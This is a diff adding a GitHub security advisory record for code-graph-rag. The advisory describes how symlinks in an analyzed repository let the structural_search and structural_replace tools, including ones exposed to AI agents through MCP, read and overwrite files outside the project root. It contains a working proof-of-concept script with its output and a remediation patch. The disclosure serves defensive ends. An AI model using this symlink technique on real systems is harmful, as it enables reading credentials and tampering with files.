@@ -1,0 +1,75 @@
+{
+  "id": "GHSA-85gg-2gfq-q95m",
+  "modified": "2026-11-09T22:30:04.094432014Z",
+  "published": "2026-11-09T22:16:41Z",
+  "aliases": [
+    "CVE-2026-87008"
+  ],
+  "summary": "Code Graph RAG structural tools follow out-of-root symlinks",
+  "details": "A remote/local attacker who can get a symbolic link included in a source-code repository that code-graph-rag analyzes can cause the `structural_search` and `structural_replace` tools (backed by `AstGrepService`, exposed both as MCP tools and as agentic AI tools) to read and -- via `structural_replace` with `dry_run=False` -- overwrite arbitrary files outside the configured project root, because the tool's path-containment check (`should_skip_path`/`_classify_file`) is performed lexically on the unresolved path and never checks `Path.is_symlink()` or calls `.resolve()`, unlike the project's own (correct) `validate_project_path` decorator used elsewhere.\n\nTested at commit `90a3ed3cbdc7d3bb8036985b851cc7c9a3ba9c57` (pyproject version 0.0.550), current `main` at test time. Confirmed this commit already contains the fix for the prior advisory (GHSA-vvr2-h2jp-838m: paginated `read_file` path traversal) and the newer HTTP-MCP bearer-auth gate (`_validate_http_exposure` in `codebase_rag/mcp/server.py`) -- this is a distinct, still-open issue on top of those fixes, in a different component with a different root cause and a strictly worse impact (write, not just read).\n\n## Details\n\n`AstGrepService` (`codebase_rag/tools/ast_grep_service.py`) backs both the `structural_search` and `structural_replace` MCP/agentic tools. It enumerates candidate files with `os.walk()` and gates each path only through `should_skip_path()`:\n\n- `codebase_rag/tools/ast_grep_service.py:84-109` (`_iter_source_files`) -- walks `self.project_root` with `os.walk()`; every non-directory dirent returned (including a symlink pointing anywhere on disk) is treated as an in-scope file.\n- `codebase_rag/tools/ast_grep_service.py:61-82` (`_classify_file`) -- the only containment check is `should_skip_path(...)` followed by `abs_path.relative_to(self.project_root)` (line 82); `abs_path` is never resolved, so this check is purely lexical/string-based.\n- `codebase_rag/utils/path_utils.py:80-109` (`should_skip_path`) and `codebase_rag/utils/path_utils.py:35-37` (`cached_relative_path`) -- computes `rel_path = file_path.relative_to(repo_path)` without ever calling `.resolve()` or `Path.is_symlink()`.\n- Read sink: `codebase_rag/tools/ast_grep_service.py:143-144` (`search`) -- `source = self._read(abs_path)` calls `path.read_text()`, which Python follows through the symlink to its real target.\n- Write sink: `codebase_rag/tools/ast_grep_service.py:187-208` (`replace`), line 208 -- `abs_path.write_text(new_source, ...)` when `dry_run=False`, again following the symlink and overwriting the real target file's content.\n\nThis is inconsistent with how the rest of the codebase handles the exact same class of risk. The file read/write/edit tools (`file_reader.py`, `file_writer.py`, `file_editor.py`) are all protected by `validate_project_path` (`codebase_rag/decorators.py:73-75`):\n\n```python\nfull_path = (self.project_root / file_path_str).resolve()\nproject_root = self.project_root.resolve()\nfull_path.relative_to(project_root)\n```\n\n`.resolve()` follows symlinks before the containment check runs, so those tools correctly reject an out-of-root target. `path_utils.py`'s own `absolute_path_within_project_root()` (`codebase_rag/utils/path_utils.py:156-176`) documents the same principle explicitly in its docstring: \"The resolve() calls are load-bearing: containment is checked lexically, so an unresolved .. segment or symlink would escape the root.\" -- but `should_skip_path()`/`AstGrepService` never applies that pattern.\n\n**Reachability:** `structural_search` (`codebase_rag/tools/structural_search.py:24-46`) carries no `requires_approval` flag at all -- in AI-orchestrator mode the model can call it autonomously with no human confirmation. `structural_replace` (`codebase_rag/tools/structural_editor.py:52-57`) is marked `requires_approval=True`, but that flag is only enforced by pydantic-ai's own agent loop -- the MCP server path bypasses it entirely: `MCPToolsRegistry.structural_replace` (`codebase_rag/mcp/tools.py:586-596`) calls `self._structural_editor_tool.function(...)` directly, registered with no approval concept at `codebase_rag/mcp/tools.py:369-388`. Any MCP client that can call tools can invoke `structural_replace` with `dry_run=False` in one shot.\n\n## Proof of Concept\n\nDynamically confirmed against the installed package (mgclient/pymgclient mocked, as in the prior advisory's own PoC, since the Memgraph native client isn't needed for this code path).\n\n```bash\nmkdir -p /tmp/poc_symlink/safe-project-root\ncat \u003e /tmp/poc_symlink/outside-secret.py \u003c\u003c 'EOF'\nAPI_TOKEN = \"sk-live-EXAMPLE-NOT-A-REAL-SECRET-1234567890\"\ndef get_token():\n    return API_TOKEN\nEOF\nln -s /tmp/poc_symlink/outside-secret.py /tmp/poc_symlink/safe-project-root/linked_module.py\n```\n\n```python\nimport sys\nfrom pathlib import Path\nfrom unittest.mock import MagicMock\nsys.modules[\"mgclient\"] = MagicMock()\nsys.modules[\"pymgclient\"] = MagicMock()\nfrom codebase_rag.tools.ast_grep_service import AstGrepService\n\nSAFE_ROOT = \"/tmp/poc_symlink/safe-project-root\"\nsvc = AstGrepService(project_root=SAFE_ROOT)\n\nmatches = svc.search(pattern=\"API_TOKEN\", language=\"python\")\n# -\u003e match in reported file='linked_module.py' text='API_TOKEN'  (read escape)\n\nchanges = svc.replace(pattern=\"API_TOKEN\", rewrite=\"PWNED_BY_STRUCTURAL_REPLACE\",\n                       language=\"python\", dry_run=False)\nprint(Path(\"/tmp/poc_symlink/outside-secret.py\").read_text())\n```\n\nActual run output:\n\n```\n[*] Calling AstGrepService.search('API_TOKEN', language='python') ...\n    match in reported file='linked_module.py' text='API_TOKEN'\n    match in reported file='linked_module.py' text='API_TOKEN'\n[+] READ ESCAPE CONFIRMED: content of the out-of-root file was returned by\n    structural_search(), attributed to a path 'inside' the project root.\n\n[*] Calling AstGrepService.replace(pattern='API_TOKEN',\n    rewrite='PWNED_BY_STRUCTURAL_REPLACE', dry_run=False) ...\n    wrote change to reported file='linked_module.py' matches=2\n\n[*] Outside file content AFTER structural_replace:\n------------------------------------------------------------\n# Simulated sensitive file OUTSIDE the analyzed project root\nPWNED_BY_STRUCTURAL_REPLACE = \"sk-live-EXAMPLE-NOT-A-REAL-SECRET-1234567890\"\n\ndef get_token():\n    return PWNED_BY_STRUCTURAL_REPLACE\n------------------------------------------------------------\n[+] WRITE ESCAPE CONFIRMED: a file OUTSIDE the configured project_root\n    (/tmp/poc_symlink/safe-project-root) was modified by structural_replace\n    via a symlink placed inside the root.\n```\n\n## Impact\n\nAny operator who points `cgr` (CLI, agentic `ask_agent` mode, or MCP `structural_search`/`structural_replace` tools) at a repository they did not fully audit -- the exact use case this tool is built for (\"query, understand, and edit multi-language codebases\") -- can have that repository's planted symlink used to:\n- Disclose the contents of any file readable by the `cgr` process (credentials, SSH keys, `.env` files, sibling project source), via `structural_search`, with no approval gate at all.\n- Overwrite the contents of any file writable by the `cgr` process, via `structural_replace(dry_run=False)`, bypassing the tool's own approval gate when called through the MCP protocol.\n\n## Remediation\n\nApply the same resolve-then-contain pattern already used by `validate_project_path` (`codebase_rag/decorators.py:73-75`) and `absolute_path_within_project_root` (`codebase_rag/utils/path_utils.py:156-176`) to `should_skip_path`. Reject any path whose resolved (symlink-followed) location escapes the resolved project root:\n\n```diff\n--- a/codebase_rag/utils/path_utils.py\n+++ b/codebase_rag/utils/path_utils.py\n@@ def should_skip_path(\n     _is_file = path.is_file() if is_file is None else is_file\n     if _is_file and path.suffix in cs.IGNORE_SUFFIXES:\n         return True\n+    # Reject symlinks (or any path) that resolve outside the project root,\n+    # mirroring validate_project_path's decorator (decorators.py:73-75) and\n+    # absolute_path_within_project_root (this module, below).\n+    try:\n+        path.resolve().relative_to(repo_path.resolve())\n+    except ValueError:\n+        return True\n     rel_path = cached_relative_path(path, repo_path)\n```\n\nConcretely: this one change in `should_skip_path` fixes both `_classify_file` (search) and the `os.walk` filtering in `_iter_source_files` (replace), since both route through it. As defense in depth, `_iter_source_files` could additionally skip symlinked dirents outright (`entry.is_symlink()`) during the `os.walk`.\n\nCredit: Dostxodjayev Abdullox (GitHub: squeeze440)",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "code-graph-rag",
+        "purl": "pkg:pypi/code-graph-rag"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "0.0.587"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "0.0.100",
+        "0.0.148",
+        "0.0.187",
+        "0.0.209",
+        "0.0.245",
+        "0.0.246",
+        "0.0.345",
+        "0.0.421",
+        "0.0.484",
+        "0.0.534",
+        "0.0.584",
+        "0.0.79",
+        "0.0.84",
+        "0.0.88",
+        "0.0.99"
+      ],
+      "database_specific": {
+        "last_known_affected_version_range": "\u003c= 0.0.586",
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-85gg-2gfq-q95m/GHSA-85gg-2gfq-q95m.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/vitali87/code-graph-rag/security/advisories/GHSA-85gg-2gfq-q95m"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-87008"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/vitali87/code-graph-rag/commit/2648c95aa550ce2d9361a8e75ed669d5f4b451b8"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/vitali87/code-graph-rag"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/vitali87/code-graph-rag/releases/tag/v0.0.589"
+    }
+  ]
+}
